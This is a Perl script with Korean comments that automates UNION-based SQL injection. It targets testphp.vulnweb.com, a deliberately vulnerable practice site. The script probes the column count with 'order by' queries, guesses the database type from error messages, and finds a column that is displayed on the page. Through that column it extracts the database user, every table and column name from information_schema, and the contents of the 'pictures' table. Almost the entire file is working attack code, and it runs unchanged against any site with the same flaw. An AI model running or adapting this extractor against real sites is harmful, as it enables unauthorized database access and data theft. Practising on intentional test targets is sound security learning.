#!/usr/bin/perl
use warnings;
use strict;
use 5.010;
use WWW::Mechanize;
my $mech=WWW::Mechanize->new; #객체생성
		
my $url="http://testphp.vulnweb.com/listproducts.php?cat=1";
#my $url="http://testasp.vulnweb.com/showforum.asp?id=2";

my (@union_query,@order_query);
for(my $i=0;$i<20;$i++) #order by 쿼리 저장. 배열 인덱스 0~20까지
{
		my $j=$i+1;
		$order_query[$i]=" order by ".$j;
}

my ($count,$field_number);
my ($content,$dbname);
$count=1; #count를 1로 설정
for (@order_query)
{
	eval{$mech->get($url.$_)}; #url 뒤에 order by 쿼리를 붙임
  $content=$mech->response->decoded_content; #응답값 받아서 content에 저장
	    
	if( $content=~/error/i) #응답값에 대소문자 구분없이 에러라는 단어가 있으면
	{
	  $field_number=$count-1; #count가 하나 더해지고 끝나므로 필드갯수를 -1해서 저장
		$dbname="mysql" if $content=~/mysql/i; #응답값에 mysql이라는 단어가 있으면 dbname으로 저장
		$dbname="mssql" if $content=~/mssql/i || $content=~/microsoft sql/i; #응답값에 mssql이라는 단어가 있으면 dbname으로 저장. 패턴은 추가할 예정
							last; #바로 반복문 종료
	}
	say "성공";
	$count++;
}

say "필드갯수: $field_number";
say "데이터베이스 종류: $dbname";

my $query="null"; #문자열 필드 알아내기 위한 union쿼리 생성
$query.=",null"x($field_number-1); #null을 피드갯수만큼 생성(null하나는 원래 있으므로 -1)

for (my $i=0; $i<$field_number; $i++)
{
	 my $copy_query=$query;
	 substr($copy_query, $i*5, 4) = "'77777'"; #
   $copy_query=" union select ".$copy_query;
	 push @union_query, $copy_query;
}

my ($string_field); #문자열 필드 번째수
my ($tag1,$tag2,$tag1_index,$tag2_index);
my $auth_length; #계정 길이

$count=1; #count 초기화
for (@union_query)
{				
	eval{$mech->get($url.$_)}; #url 뒤에 union 쿼리를 붙임
	$content=$mech->response->decoded_content; #응답값 얻어서 저장
	if ($content=~/(<\/?\s*\w*\s*\w*=?"?\w*"?>)\s*77777\s*(<\/\w*>)/) #응답값이 정규표현식에 일치하면.
	{
		$tag1=$1; 
		$tag2=$2;
		$tag1=~s/\s//g; #tag안에 있을 수 있는 공백 제거
		$tag2=~s/\s//g;

		$string_field=$count; #문자열 필드 넘버 저장
		say "$count: 문자열 필드입니다";
						
		$content=~s/\s//g; #77777이 두개 이상이므로 정확한 77777을 일치시키기 위해 공백을 제거
		$tag1_index=index($content,$tag1."77777"); #tag1은 여러개이므로 tag1과 77777이 같이있는 인덱스를 구해서 저장
		$tag2_index=index($content,$tag2,$tag1_index); #tag2의 인덱스를 tag1의 인덱스봐 뒤에서부터 찾아서 저장

		say "tag1_index: $tag1_index, tag2_index: $tag2_index";
		last; #반복문 끝냄
	}
	$count++;
}

my ($auth_query,$auth_len,$auth); 

$auth_query=$union_query[$string_field-1]; #유니온 쿼리 배열에서 문자열필드 번째수에서 -1을 한 인덱스를 auth_query에 저장  
if( !defined($dbname) ) #dbname이 undef면 dbname을 다시 얻기
{
	$auth_query =~ s/'77777'/user\(\)/; #'77777'을 user()로 바꿈    
  eval{$mech->get($url.$auth_query)};
  $content=$mech->response->decoded_content;

 	if ($content=~/error/i) #대소문자 구분없이 에러라는 단어가 있으면 mssql
	{
		$dbname="mssql";
	}
	else #에러가 안뜨면 mysql
	{
		$dbname="mysql";
	} 
}
						
$auth_query=$union_query[$string_field-1]; #auth쿼리 초기화(지금은 두개지만 디비 종류가 많아질땐 이게 바뀌니까 초기화) 
if( $dbname eq "mysql") #디비가 mysql이면
{
	$auth_query =~ s/'77777'/user\(\)/; #계정을 알아내는 쿼리 생성    
	$auth_query =~ s/'77777'/user_name\(\)/ if $dbname eq "mssql";   
			
	eval{$mech->get($url.$auth_query)};
	$content=$mech->response->decoded_content;
	$content=~s/\s//g; #공백 제거
	$tag1_index=index($content,$tag1,$tag1_index-1); #응답값이 바뀌었으므로 tag1위치 갱신(두번쨰 응답값의 tag1이 더 뒤에 있을거라는 가정 하에 가능)
	$tag2_index=index($content,$tag2,$tag1_index); #갱신된 tag1 인덱스 뒤부터 tag2 인덱스 찾기
	$auth_len=$tag2_index-$tag1_index-length($tag1); #tag2위치에서 tag1위치와 tag1의 문자열 길이를 빼서 계정의 길이 구함
	$auth=substr($content,$tag1_index+length($tag1),$auth_len); #tag1위치에서 tag1길이를 더한 위치에서부터 계정 길이만큼 얻어서 계정을 구함
				
	say "tag1_index: $tag1_index, tag2_index: $tag2_index";
	say "계정 길이: $auth_len";
	say "계정: $auth";
}

my ($table_len,$table);
my $table_query=$union_query[$string_field-1]." from information_schema.tables where table_schema=database()";
$table_query=~s/'77777'/group_concat(table_name)/;

eval{$mech->get($url.$table_query)};
$content=$mech->response->decoded_content;
$content=~s/\s//g; #공백 제거
$tag1_index=index($content,$tag1,$tag1_index-1); 
$tag2_index=index($content,$tag2,$tag1_index); 
$table_len=$tag2_index-$tag1_index-length($tag1); 
$table=substr($content,$tag1_index+length($tag1),$table_len);

my @tables=split(/,/,$table);
#}

my %table_info;
my ($column_len,@columns,$column);
for my $table_name (@tables)
{
	my $column_query=$union_query[$string_field-1]." from information_schema.columns where table_name='$table_name'";
	$column_query=~s/'77777'/group_concat(column_name)/;
		
	eval{$mech->get($url.$column_query)};
	$content=$mech->response->decoded_content;
	$content=~s/\s//g; #공백 제거
	
	$tag1_index=index($content,$tag1,$tag1_index-1);
	$tag2_index=index($content,$tag2,$tag1_index);
	$column_len=$tag2_index-$tag1_index-length($tag1);
	$column=substr($content,$tag1_index+length($tag1),$column_len);

	$table_info{$table_name}=$column;
}

my ($val_query,$val_len,$val);

say "[테이블과 필드 정보]";
while( (my $key, my $value)=each %table_info) #key:테이블 $value: 칼럼 
{
	say "$key: $value";
}

#say $auth_query;

my %column_info;
my @arr;
my @vals;
my @new_arr;
while((my $table, my $column_name)=each %table_info) #key:테이블 $value: 칼럼
{
	next unless $table eq 'pictures';
		   	
	@columns=split(/,/,$column_name); #,로 나눠서 배열에 저장
	for my $column_name (@columns)
	{
		my $val_query=$union_query[$string_field-1]." from $table";
		$val_query=~s/'77777'/group_concat($column_name,\'---\')/;
		eval{$mech->get($url.$val_query)};
		$content=$mech->response->decoded_content;
		$content=~s/\s//g; #공백 제거
				
		$tag1_index=index($content,$tag1,$tag1_index-1);
		if($tag1_index eq -1) { say "tag1이 뒤에있다!!!!";}
								
		$tag2_index=index($content,$tag2,$tag1_index);
		$val_len=$tag2_index-$tag1_index-length($tag1);
		$val=substr($content,$tag1_index+length($tag1),$val_len);
		if ($val =~ /</ || $val eq '')
		{
			say "$column_name에 아무런 데이터가 없음";
		}
		else
		{
			$column_info{$column_name}=$val;
			push @new_arr,$column_name;
			@vals=split(/---,?/,$val);
			push @arr,@vals;
			push @arr,"//";
		}
	}
	
	say "[테이블 $table]";
	my $j=1;
	$count=0;
	my $count2=0;
	if($table eq 'pictures')
	{
		say "@new_arr";
#		say "@arr";
		for my $column_value(@arr)
		{
			last if $column_value eq "//";
			$count++;
		}	
#		say $count;
#		say $#new_arr;

		for (my $i=0; $i<$count; $i++)
		{
			for (my $j=0; $j<($#new_arr+1); $j++)
			{
				print "$arr[$i+($j*($count+1))] ";		
			}		
			say '';
		}
	}
	@columns=();
	%column_info=();
	@arr=();
	@new_arr=();
}
=cut
	if($table eq "pictures")
	{		
		say "@columns";
		while(1)
		{
			for my $column_name(@columns)
			{	
				for(my $i=0;$i<$#arr;$i++)
				{
					if($arr[$i] eq $$column_name)
					{
						my $k=$i+$j;
						if($arr[$k] eq "//")
						{
							$count++;
							push @new_arr,"undef";
							$columns[$count2]="";
							last;
						}
						else
						{
							push @new_arr,$arr[$k];
							last;
						}
					}
				}
				$count2++;
			}
      $j++;
			$count2=0;
			say "@new_arr";
			@new_arr=();
			
			if ($#columns+1 eq $count)
			{
			 last;	
			}#while문 탈출
		}
	}
	@columns=();
	%column_info=();
	@arr=();
	@new_arr=();
}
